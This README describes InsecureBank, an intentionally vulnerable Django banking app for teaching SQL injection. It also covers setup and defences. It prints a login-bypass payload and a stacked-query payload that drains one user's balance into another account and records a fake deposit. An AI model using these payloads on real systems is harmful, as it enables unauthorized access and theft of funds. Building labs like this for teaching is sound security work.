# SQL Injection - InsecureBank

## Overview
**InsecureBank** is a vulnerable web application designed to demonstrate SQL injection attacks in a real-world banking scenario. The project highlights how unsanitized input fields can be exploited to manipulate backend databases, emphasizing the importance of secure coding practices.

## Features
- Demonstrates both **simple** and **complex** SQL injection techniques.
- Allows execution of **multiple SQL statements** in one request.
- Built with **Django** and runs using **Docker** for easy deployment.

## Technologies Used
- **Python (Django Framework)**
- **SQLite Database**
- **Docker** (for containerized deployment)

---

## How SQL Injection Works
A form input is vulnerable to SQL injection when it does not sanitize user inputs before executing SQL queries. Depending on how queries are executed, attackers may exploit:
1. **Boolean-based SQL injection** (modifying query logic using `AND` / `OR` conditions).
2. **Union-based SQL injection** (retrieving hidden data via `UNION SELECT`).
3. **Error-based SQL injection** (leveraging error messages for database insights).
4. **Time-based SQL injection** (detecting vulnerabilities via response delays).

This demo has been intentionally made as **vulnerable as possible** by allowing execution of **multiple SQL statements** in one request.

---

## Installation and Setup

### Running via Docker (Recommended)
```sh
docker build -t insecurebank .
docker run -p 8000:8000 insecurebank
```
Access the application at: [http://localhost:8000](http://localhost:8000)

### Running without Docker
```sh
python3 manage.py runserver
```
Access the application at: [http://localhost:8000](http://localhost:8000)

---

## SQL Injection Examples

### **Basic SQL Injection (Bypassing Login)**
By entering the following into the **username** field, an attacker can bypass authentication:
```sql
' OR '1'='1
```
This works because `'1'='1'` is always **true**, allowing unauthorized access.

### **Complex SQL Injection (Fund Transfer Exploit)**
This payload transfers money from **user: demo** to **user: hackerman**:
```sql
'; UPDATE bank_bankaccount
SET balance = balance + (SELECT balance FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo'))
WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman');

INSERT INTO bank_transaction (bank_account_id, amount, note, type, transaction_date)
VALUES (
  (SELECT id FROM bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='hackerman')),
  (SELECT balance from bank_bankaccount WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo')),
  'All of demo user\'s money!',
  'Deposit',
  '0'
);

UPDATE bank_bankaccount
SET balance = 0
WHERE owner_id = (SELECT id FROM auth_user WHERE username='demo');
```

---

## Security Mitigation Strategies
To prevent SQL injection, developers should:
- **Use prepared statements and parameterized queries** (e.g., `cursor.execute(query, params)`).
- **Sanitize and validate user input** before processing queries.
- **Implement web application firewalls (WAF)** to filter malicious input.
- **Limit database permissions** to minimize the impact of an attack.
- **Use ORM frameworks** like Django ORM to abstract raw SQL execution.

---

## Disclaimer
This project is for **educational and research purposes only**. Do not use it to target real applications. The author is **not responsible** for any misuse of this information.

---

## License
This project is licensed under the **MIT License**. See the `LICENSE` file for details.

---


